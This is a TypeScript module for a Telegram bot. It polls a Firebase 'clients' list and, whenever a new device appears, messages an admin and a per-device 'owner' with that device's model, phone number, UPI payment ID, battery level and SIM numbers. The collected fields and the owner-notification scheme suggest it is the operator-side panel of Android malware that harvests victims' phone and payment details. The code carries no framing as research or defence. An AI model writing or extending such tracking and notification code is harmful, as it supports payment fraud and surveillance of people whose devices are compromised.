import { Telegraf } from "telegraf";
import { logger } from "../lib/logger";
import { fbGet } from "./firebase";

let knownDevices = new Set<string>();
let initialized = false;

export function startDeviceWatcher(bot: Telegraf, adminId: number): void {
  const POLL_INTERVAL = 20_000;

  async function poll() {
    try {
      const clients = await fbGet("clients");
      if (!clients) return;

      const currentIds = new Set<string>(Object.keys(clients));

      if (!initialized) {
        // First run — seed without notification
        knownDevices = currentIds;
        initialized = true;
        logger.info({ count: knownDevices.size }, "Device watcher initialized");
        return;
      }

      for (const id of currentIds) {
        if (!knownDevices.has(id)) {
          const device = clients[id];
          const model   = device?.modelName || device?.model || "Unknown Model";
          const phone   = device?.mobNo || device?.phone || "Unknown";
          const upi     = device?.upi || "N/A";
          const battery = device?.battery || "?%";
          const sim1    = device?.sim1 || "";
          const sim2    = device?.sim2 || "";
          const ownerTelegramId: string | null = device?.ownerTelegramId || null;

          logger.info({ deviceId: id, model, ownerTelegramId }, "New device detected");

          const msg =
            `🆕 *New Device Connected!*\n\n` +
            `📱 Model: \`${model}\`\n` +
            `📞 Phone: \`${phone}\`\n` +
            `💳 UPI: \`${upi}\`\n` +
            `🔋 Battery: ${battery}\n` +
            (sim1 ? `📶 SIM1: \`${sim1}\`\n` : "") +
            (sim2 ? `📶 SIM2: \`${sim2}\`\n` : "") +
            `\n🆔 Device ID: \`${id}\``;

          // Notify device owner first (if known and not admin)
          if (ownerTelegramId && ownerTelegramId !== adminId.toString()) {
            try {
              await bot.telegram.sendMessage(ownerTelegramId, msg, {
                parse_mode: "Markdown",
              });
            } catch (err) {
              logger.error({ err, ownerTelegramId }, "Failed to notify device owner");
            }
          }

          // Always notify admin
          try {
            await bot.telegram.sendMessage(
              adminId,
              msg + (ownerTelegramId ? `\n👤 Owner: \`${ownerTelegramId}\`` : ""),
              { parse_mode: "Markdown" }
            );
          } catch (err) {
            logger.error({ err }, "Failed to send new device notification to admin");
          }

          knownDevices.add(id);
        }
      }

      // Remove deleted devices from tracking set
      for (const id of knownDevices) {
        if (!currentIds.has(id)) knownDevices.delete(id);
      }
    } catch (err) {
      logger.error({ err }, "Device watcher poll error");
    }
  }

  setInterval(poll, POLL_INTERVAL);
  poll();
  logger.info("Device watcher started (polling every 20s)");
}
